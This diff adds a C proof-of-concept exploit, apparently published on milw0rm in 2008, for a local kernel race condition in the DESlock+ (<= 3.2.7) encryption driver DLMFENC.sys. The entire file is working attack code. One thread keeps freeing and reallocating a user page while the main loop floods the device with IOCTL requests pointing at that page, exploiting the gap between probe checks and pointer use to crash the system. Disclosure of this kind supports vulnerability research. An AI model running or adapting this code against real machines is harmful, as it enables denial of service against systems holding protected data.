@@ -1,0 +1,139 @@
+/* deslock-probe-race.c
+ *
+ * Copyright (c) 2008 by <mu-b@digit-labs.org>
+ *
+ * DESlock+ <= 3.2.7 local kernel race condition DoS POC
+ * by mu-b - Fri 22 Feb 2008
+ *
+ * - Tested on: DLMFENC.sys 1.0.0.28
+ *
+ * race conditions between calls to ProbeForRead/ProbeForWrite
+ * and pointer use.
+ *
+ * "Note that subsequent accesses by the driver to the user-mode
+ *   buffer must also be encapsulated within a try/except block;"
+ *  - http://msdn.microsoft.com/en-us/library/ms797108.aspx
+ *
+ * http://www.cctmark.gov.uk/CCTMAwards/DataEncryptionSystemsLtd/tabid/103/Default.aspx
+ * - I wonder what that says about CESG CCTM?
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <windows.h>
+
+#define DLMFENC_IOCTL 0x0FA4204C
+#define DLMFENC_FLAG  0xDEADBEEF
+
+#define ARG_SIZE(a)   ((a-(sizeof (int)*2))/sizeof (void *))
+
+struct ioctl_req {
+  int flag;
+  int req_num;
+  void *arg[ARG_SIZE(0x20)];
+};
+
+void
+hammer_thread (void *zpage)
+{
+  BOOL result;
+
+  printf ("* [child] using page @0x%08X\n", zpage);
+
+  while (1)
+    {
+      result = VirtualFree (zpage, 0, MEM_RELEASE);
+      if (result == 0)
+        {
+          fprintf (stderr, "* [child] VirtualFree failed\n");
+          exit (EXIT_FAILURE);
+        }
+
+      zpage = VirtualAlloc ((LPVOID) 0x41000000, 0x10000,
+                             MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+      if (zpage == NULL)
+        {
+          fprintf (stderr, "* [child] VirtualAlloc failed\n");
+          exit (EXIT_FAILURE);
+        }
+    }
+}
+
+int
+main (int argc, char **argv)
+{
+  struct ioctl_req req;
+  HANDLE hFile, hThread;
+  DWORD rlen, dThread, nTotal, nFail;
+  LPVOID zpage;
+  BOOL result;
+
+  printf ("DESlock+ <= 3.2.7 local kernel race condition DoS PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  fflush (stdout);
+  hFile = CreateFileA ("\\\\.\\DLKPFSD_Device", FILE_EXECUTE,
+                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
+                       OPEN_EXISTING, 0, NULL);
+  if (hFile == INVALID_HANDLE_VALUE)
+    {
+      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
+      exit (EXIT_FAILURE);
+    }
+
+  zpage = VirtualAlloc ((LPVOID) 0x41000000, 0x10000,
+                        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  if (zpage == NULL)
+    {
+      fprintf (stderr, "* VirtualAlloc failed\n");
+      exit (EXIT_FAILURE);
+    }
+  printf ("* allocated page: 0x%08X [%d-bytes]\n",
+          zpage, 0x10000);
+
+  hThread = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) hammer_thread,
+                          zpage, 0, &dThread);
+  if (hThread == NULL)
+    {
+      fprintf (stderr, "* CreateThread failed\n");
+      exit (EXIT_FAILURE);
+    }
+
+  nTotal = nFail = 0;
+  while (1)
+    {
+      memset (&req, 0, sizeof req);
+      req.flag = DLMFENC_FLAG;
+      req.req_num = 4;
+      req.arg[0] = (void *) zpage;
+
+      nTotal++;
+      result = DeviceIoControl (hFile, DLMFENC_IOCTL,
+                                &req, sizeof req, &req, sizeof req, &rlen, 0);
+      if (!result)
+        {
+          if (!(nFail++ % 1024))
+            {
+              char *p_arr[] = { "DESLock", "ProbeForWrite", "a", "races",
+                                "dull", "make", "boy" };
+              fprintf (stderr, "* total: %d [failed: %d, %f%%] [%13s]\r",
+                       nTotal, nFail, (((double) nFail)/nTotal)*100, p_arr[nFail%7]);
+              fflush (stderr);
+          }
+        }
+    }
+
+  /* unreachable! */
+  printf ("* hmmm, you didn't STOP the box?!?!\n");
+
+  CloseHandle (hFile);
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2008-09-20]
